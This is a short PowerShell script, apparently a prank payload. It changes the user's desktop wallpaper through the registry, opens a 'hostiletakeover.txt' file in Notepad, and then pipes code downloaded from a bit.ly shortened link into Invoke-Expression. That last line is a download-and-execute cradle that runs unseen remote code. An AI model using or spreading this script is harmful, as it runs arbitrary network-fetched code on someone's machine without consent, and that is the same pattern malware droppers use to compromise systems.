#Change Wallpaper to Wolfe Bricks
Function Set-WallPaper($Value)
 {
    Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value
    rundll32.exe user32.dll, UpdatePerUserSystemParameters
 }
Set-WallPaper -value "C:\Users\Gymboss\Temp\WolfeBricks.png"

#Open text file on Desktop
$FileLocation = 'C:\Users\Gymboss\Temp\hostiletakeover.txt'
Start-Process notepad $FileLocation

#Sleep for Readablity
Start-Sleep -Seconds 10

#Rick Roll using Powershell credit to Lee Holmes
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")